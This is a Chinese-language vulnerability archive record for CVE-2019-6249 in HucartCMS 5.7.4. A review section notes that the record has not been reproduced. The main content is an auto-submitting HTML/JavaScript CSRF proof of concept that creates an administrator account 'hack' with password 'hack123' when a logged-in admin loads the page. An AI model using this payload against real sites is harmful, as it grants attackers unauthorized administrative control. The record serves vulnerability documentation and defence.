---
cve: "CVE-2019-6249"
source: "白阁文库 BaizeSec/bylibrary"
product: "HucartCMS5.7.4"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2019-6249"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Hucart cms v5.7.4 CSRF漏洞可任意增加管理员账号"
prerequisites: "来源所述条件，未列明部分仍待核：已登录管理员，跨站Cookie可发送，自动window.onload表单"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-825704aee763f7cec0c93de1"
entity_id: "ve-825704aee763f7cec0c93de1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录管理员，跨站Cookie可发送，自动window.onload表单

- **凭据与会话边界（1）**：作者日期CVE链接完整，缺服务端代码/请求响应和浏览器Cookie策略。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：fields未初始化会在HTML前加入undefined文本，通常不阻止表单但宜规范。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（3）**：只能证明示例意图，尚未外部确认受影响与修复版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Hucart cms v5.7.4 CSRF漏洞可任意增加管理员账号

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Hucart cms v5.7.4 CSRF漏洞可任意增加管理员账号|2019-01-13|AllenChen（520allen@gmail.com）|[http://www.hucart.com/](http://www.hucart.com/) | [http://www.hucart.com/](http://www.hucart.com/) |v5.7.4| [CVE-2019-6249](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6249)|  

#### 漏洞概述  

> Hucart cms v5.7.4版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加一个名为hack的管理员账号。   

### POC实现代码如下：  

> exp代码如下：  
> 增加一个名为hack密码为hack123的管理员账号。

``` html
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='adm_user' value='hack' />";
fields += "<input type='hidden' name='adm_email' value='admin@hack.com' />";  
fields += "<input type='hidden' name='adm_mobile' value='13888888888' />";  
fields += "<input type='hidden' name='adm_pwd' value='hack123' />";  
fields += "<input type='hidden' name='re_adm_pwd' value='hack123' />";  
fields += "<input type='hidden' name='adm_enabled' value='1' />";  
fields += "<input type='hidden' name='act_type' value='add' />";  
fields += "<input type='hidden' name='adm_id' value='' />";  

var url = "http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```


---

> 来源：白阁文库 BaizeSec/bylibrary
